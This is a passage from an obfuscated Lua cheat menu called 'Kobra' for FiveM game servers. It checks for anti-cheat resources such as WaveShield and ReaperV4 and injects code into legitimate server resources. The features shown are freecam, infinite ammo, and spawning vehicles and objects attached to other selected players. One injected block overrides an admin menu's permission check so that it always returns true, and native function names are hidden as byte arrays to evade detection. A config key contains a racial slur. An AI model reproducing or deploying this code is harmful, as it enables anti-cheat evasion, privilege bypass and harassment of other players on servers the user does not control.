v1321) ;v1515=1 + 0 ;end end end if IsControlPressed(0,19 + 15 ) then local v1516=0;while true do if (v1516==(1426 -(85 + 1341))) then v1324=v1324-(v1323.x * v1321) ;v1325=v1325-(v1323.y * v1321) ;break;end end end v1317=4;end end end end end);else _G.KobraFreecamEnabled=true;end end break;end end else local v520=0;while true do if ((1 -0)==v520) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1114,v1115) local v1116=_G[v1114];if ( not v1116 or (type(v1116)~="function")) then return;end _G[v1114]=function(...) return v1115(v1116,...);end;end hNative("CreateThread",function(v1117,...) return v1117(...);end);hNative("Wait",function(v1118,...) return v1118(...);end);hNative("IsVehicleSeatFree",function(v1119,...) return v1119(...);end);hNative("PlayerPedId",function(v1120,...) return v1120(...);end);hNative("GetEntityCoords",function(v1121,...) return v1121(...);end);hNative("CreateCam",function(v1122,...) return v1122(...);end);hNative("SetCamCoord",function(v1123,...) return v1123(...);end);hNative("SetCamRot",function(v1124,...) return v1124(...);end);hNative("RenderScriptCams",function(v1125,...) return v1125(...);end);hNative("DestroyCam",function(v1126,...) return v1126(...);end);hNative("SetFocusEntity",function(v1127,...) return v1127(...);end);hNative("SetTextFont",function(v1128,...) return v1128(...);end);hNative("SetTextProportional",function(v1129,...) return v1129(...);end);hNative("SetTextScale",function(v1130,...) return v1130(...);end);hNative("SetTextDropShadow",function(v1131,...) return v1131(...);end);hNative("SetTextEdge",function(v1132,...) return v1132(...);end);hNative("SetTextOutline",function(v1133,...) return v1133(...);end);hNative("SetTextCentre",function(v1134,...) return v1134(...);end);hNative("SetTextColour",function(v1135,...) return v1135(...);end);hNative("BeginTextCommandDisplayText",function(v1136,...) return v1136(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1137,...) return v1137(...);end);hNative("EndTextCommandDisplayText",function(v1138,...) return v1138(...);end);hNative("GetCamCoord",function(v1139,...) return v1139(...);end);hNative("GetCamRot",function(v1140,...) return v1140(...);end);hNative("IsControlPressed",function(v1141,...) return v1141(...);end);hNative("GetDisabledControlNormal",function(v1142,...) return v1142(...);end);hNative("TaskStandStill",function(v1143,...) return v1143(...);end);hNative("SetFocusPosAndVel",function(v1144,...) return v1144(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1145,...) return v1145(...);end);hNative("GetShapeTestResult",function(v1146,...) return v1146(...);end);hNative("IsControlJustPressed",function(v1147,...) return v1147(...);end);hNative("IsDisabledControlJustPressed",function(v1148,...) return v1148(...);end);hNative("IsEntityAVehicle",function(v1149,...) return v1149(...);end);hNative("TaskWarpPedIntoVehicle",function(v1150,...) return v1150(...);end);hNative("SetEntityCoords",function(v1151,...) return v1151(...);end);hNative("GiveWeaponToPed",function(v1152,...) return v1152(...);end);hNative("SetCurrentPedWeapon",function(v1153,...) return v1153(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1154,...) return v1154(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then local v1169=0;while true do if (v1169==(0 -0)) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v890=372 -(45 + 327) ;while true do if (v890==(14 -6)) then hNative("GetShapeTestResult",function(v1170,...) return v1170(...);end);hNative("IsControlJustPressed",function(v1171,...) return v1171(...);end);hNative("IsDisabledControlJustPressed",function(v1172,...) return v1172(...);end);hNative("IsEntityAVehicle",function(v1173,...) return v1173(...);end);v890=511 -(444 + 58) ;end if (v890==(3 + 3)) then hNative("EndTextCommandDisplayText",function(v1174,...) return v1174(...);end);hNative("GetCamCoord",function(v1175,...) return v1175(...);end);hNative("GetCamRot",function(v1176,...) return v1176(...);end);hNative("IsControlPressed",function(v1177,...) return v1177(...);end);v890=7;end if (5==v890) then hNative("SetTextCentre",function(v1178,...) return v1178(...);end);hNative("SetTextColour",function(v1179,...) return v1179(...);end);hNative("BeginTextCommandDisplayText",function(v1180,...) return v1180(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1181,...) return v1181(...);end);v890=2 + 4 ;end if (v890==(5 + 5)) then hNative("ShootSingleBulletBetweenCoords",function(v1182,...) return v1182(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then local v1301=0 -0 ;while true do if (v1301==(1732 -(64 + 1668))) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v890==(1977 -(1227 + 746))) then hNative("SetTextScale",function(v1183,...) return v1183(...);end);hNative("SetTextDropShadow",function(v1184,...) return v1184(...);end);hNative("SetTextEdge",function(v1185,...) return v1185(...);end);hNative("SetTextOutline",function(v1186,...) return v1186(...);end);v890=5;end if (v890==(21 -14)) then hNative("GetDisabledControlNormal",function(v1187,...) return v1187(...);end);hNative("TaskStandStill",function(v1188,...) return v1188(...);end);hNative("SetFocusPosAndVel",function(v1189,...) return v1189(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1190,...) return v1190(...);end);v890=14 -6 ;end if (v890==(495 -(415 + 79))) then hNative("Wait",function(v1191,...) return v1191(...);end);hNative("IsVehicleSeatFree",function(v1192,...) return v1192(...);end);hNative("PlayerPedId",function(v1193,...) return v1193(...);end);hNative("GetEntityCoords",function(v1194,...) return v1194(...);end);v890=1 + 1 ;end if (v890==(494 -(142 + 349))) then hNative("DestroyCam",function(v1195,...) return v1195(...);end);hNative("SetFocusEntity",function(v1196,...) return v1196(...);end);hNative("SetTextFont",function(v1197,...) return v1197(...);end);hNative("SetTextProportional",function(v1198,...) return v1198(...);end);v890=2 + 2 ;end if (v890==(0 -0)) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1199,v1200) local v1201=0 + 0 ;local v1202;while true do if (v1201==(0 + 0)) then v1202=_G[v1199];if ( not v1202 or (type(v1202)~="function")) then return;end v1201=1;end if (1==v1201) then _G[v1199]=function(...) return v1200(v1202,...);end;break;end end end hNative("CreateThread",function(v1203,...) return v1203(...);end);v890=2 -1 ;end if (v890==2) then hNative("CreateCam",function(v1204,...) return v1204(...);end);hNative("SetCamCoord",function(v1205,...) return v1205(...);end);hNative("SetCamRot",function(v1206,...) return v1206(...);end);hNative("RenderScriptCams",function(v1207,...) return v1207(...);end);v890=1867 -(1710 + 154) ;end if (v890==9) then hNative("TaskWarpPedIntoVehicle",function(v1208,...) return v1208(...);end);hNative("SetEntityCoords",function(v1209,...) return v1209(...);end);hNative("GiveWeaponToPed",function(v1210,...) return v1210(...);end);hNative("SetCurrentPedWeapon",function(v1211,...) return v1211(...);end);v890=328 -(200 + 118) ;end end end break;end if (v520==(0 + 0)) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v520=1 -0 ;end end end end;v12.EnableInfiniteAmmo=function(v200) if (GetResourceState("WaveShield")=="started") then print("1");local function v521(v569) local v570="";for v667=1, #v569 do v570=v570   .. string.char(v569[v667]) ;end return v570;end local function v522(v571) return _G[v521(v571)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v523=v522({72 + 8 ,107 + 1 ,97,121,101,246 -132 ,139 -59 ,101,100,73,233 -133 });local v524=v522({1735 -(674 + 990) ,29 + 72 ,183 -67 ,1138 -(507 + 548) ,1919 -(821 + 997) ,30 + 78 ,1602 -(251 + 1250) ,289 -190 ,116,1133 -(809 + 223) ,100,264 -184 ,75 + 26 ,100,216 -(118 + 11) ,101,282 -185 ,112,71 + 40 ,90 + 20 });local v525=v522({163 -92 ,400 -299 ,205 -(40 + 49) ,562 -(99 + 391) ,97,284 -169 ,102 + 2 ,197 -122 ,101,121});local v526=v522({71,101,91 + 25 ,65,109,420 -311 ,313 -202 ,102 -29 ,244 -134 ,80,1726 -(950 + 675) ,39 + 61 ,1374 -(485 + 802) ,101,656 -(432 + 127) ,63 + 49 ,111,1711 -(635 + 966) });local v527=v522({65,248 -148 ,100,28 + 37 ,52 + 57 ,413 -304 ,208 -97 ,84,111,393 -313 ,101,100});local v528=v522({68,258 -147 ,418 -(301 + 16) ,337 -222 ,193 -124 ,287 -177 ,66 + 50 ,64 + 41 ,116,40 + 81 ,246 -177 ,120,260 -155 ,115,38 + 78 });local v529=v522({87,710 -(520 + 93) ,105,42 + 74 });local v530={};local function v531(v572) local v573=0;local v574;local v575;while true do if (v573==0) then v574=coroutine.create(v572);v575=nil;v573=3 -2 ;end if (v573==(592 -(396 + 195))) then function v575() while coroutine.status(v574)~="dead"  do local v967,v968=coroutine.resume(v574);if  not v967 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v968);break;end v529(0);end end v575();break;end end end if  not _G.osintWaveLoop then _G.osintWaveLoop=true;v531(function() while _G.osintWaveLoop do local v848=0 -0 ;while true do if (v848==0) then if _G.osintInfAmmo.enabled then local v1212=1761 -(440 + 1321) ;local v1213;while true do if (v1212==(1829 -(1059 + 770))) then v1213=v523();if v528(v1213) then local v1435=0 -0 ;local v1436;while true do if (v1435==(545 -(424 + 121))) then v1436=v524(v1213);if (v1436 and (v1436~=v525("WEAPON_UNARMED"))) then local v1649=0 + 0 ;local v1650;local v1651;local v1652;while true do if (v1649==(1347 -(641 + 706))) then v1650,v1651=v526(v1213,v1436);v1652=tostring(v1213);v1649=1 + 0 ;end if (v1649==(441 -(249 + 191))) then if  not v530[v1652] then v530[v1652]=v1651;end if (v1651<v530[v1652]) then v527(v1213,v1436,v530[v1652] -v1651 );end break;end end end break;end end end break;end end else coroutine.yield();end coroutine.yield();break;end end end end);end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v201) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v202,v203,v204) if ( not v203 or ( #v203==(0 -0))) then local v532=0;while true do if (v532==0) then v202:Notify("error","Kobra","No players selected!",1340 + 1660 );return;end end end if ( not v204 or ( #v204==0)) then local v533=0 -0 ;while true do if (v533==(427 -(183 + 244))) then v202:Notify("error","Kobra","Invalid vehicle model!",3000);return;end end end local function v205(v329) local v330=0 + 0 ;local v331;while true do if (v330==0) then v331={};for v746=731 -(434 + 296) , #v329 do v331[v746]=string.byte(v329,v746);end v330=2 -1 ;end if (v330==1) then return table.concat(v331,",");end end end local v206=v204;local v207=v205(v206);local v208=GetCurrentServerEndpoint();local v209=512 -(169 + 343) ;for v332,v333 in ipairs(v203) do if (GetResourceState("solos-rentals")=="started") then local v576=0 + 0 ;local v577;local v578;while true do if (0==v576) then print("[vehicle_attach] Fallback: solos-rentals");v577,v578=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v207,v333));end);v576=1 -0 ;end if (v576==(2 -1)) then if v577 then v209=v209 + 1 + 0 ;end break;end end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v748,v749=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v207,v333));end);if v748 then v209=v209 + 1 ;end elseif (GetResourceState("qb-core")=="started") then local v891=0;local v892;local v893;while true do if (v891==(2 -1)) then if v892 then v209=v209 + (1124 -(651 + 472)) ;end break;end if (v891==0) then print("[vehicle_attach] Fallback #02");v892,v893=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v207,v333));end);v891=1 + 0 ;end end elseif ((v208:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1023=0 + 0 ;local v1024;local v1025;while true do if (v1023==(1 -0)) then if v1024 then v209=v209 + (484 -(397 + 86)) ;end break;end if ((876 -(423 + 453))==v1023) then print("[vehicle_attach] Fallback #1");v1024,v1025=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v207,v333));end);v1023=1 + 0 ;end end elseif (GetResourceState("lunar_bridge")=="started") then print("[vehicle_attach] Fallback #2");local v1214,v1215=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v207,v333));end);if v1214 then v209=v209 + 1 + 0 ;end elseif (GetResourceState("lation_laundering")=="started") then local v1331=0;local v1332;local v1333;while true do if (v1331==1) then if v1332 then v209=v209 + 1 ;end break;end if (v1331==(0 + 0)) then print("[vehicle_attach] Fallback #3");v1332,v1333=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v207,v333));end);v1331=1;end end else print("[vehicle_attach] Universal Fallback");local v1334,v1335=pcall(function() local v1386=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v207,v333);MachoInjectResourceRaw("any",v1386,v333);end);if v1334 then v209=v209 + 1 + 0 ;end end end end;function encodeToByteArrayLiteral(v210) local v211=0 + 0 ;local v212;while true do if (v211==2) then for v668=1191 -(50 + 1140) , #v210 do v212[ #v212 + 1 + 0 ]=tostring(string.byte(v210,v668));end return table.concat(v212,", ");end if (v211==(1 + 0)) then if ( #v210==(0 + 0)) then return "";end v212={};v211=2 -0 ;end if (v211==(0 + 0)) then if  not v210 then return "";end if (type(v210)~="string") then return tostring(v210);end v211=1;end end end v12.SpawnSelectedObject=function(v213,v214) if ( not v214 or ( #v214==(596 -(157 + 439)))) then local v534=0;while true do if (v534==(0 -0)) then v213:Notify("error","Kobra","No players selected!",9968 -6968 );return;end end end local v215=v213:GetSelectedObjectModel();if ( not v215 or ( #v215==0)) then local v535=0;while true do if (v535==0) then v213:Notify("error","Kobra","Invalid object model!",8874 -5874 );return;end end end local v216=encodeToByteArrayLiteral(v215);local v217=918 -(782 + 136) ;for v334,v335 in ipairs(v214) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then v213:Notify("error","Kobra","Using Qb-core Spawner!",3855 -(112 + 743) );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v216,v335));v217=v217 + 1 ;elseif (GetResourceState("cd_dispatch")=="started") then local v750=0;while true do if (v750==1) then v217=v217 + 1 ;break;end if (v750==(1171 -(1026 + 145))) then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v216,v335));v750=1 + 0 ;end end elseif (GetResourceState("rcore_drunk")=="started") then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
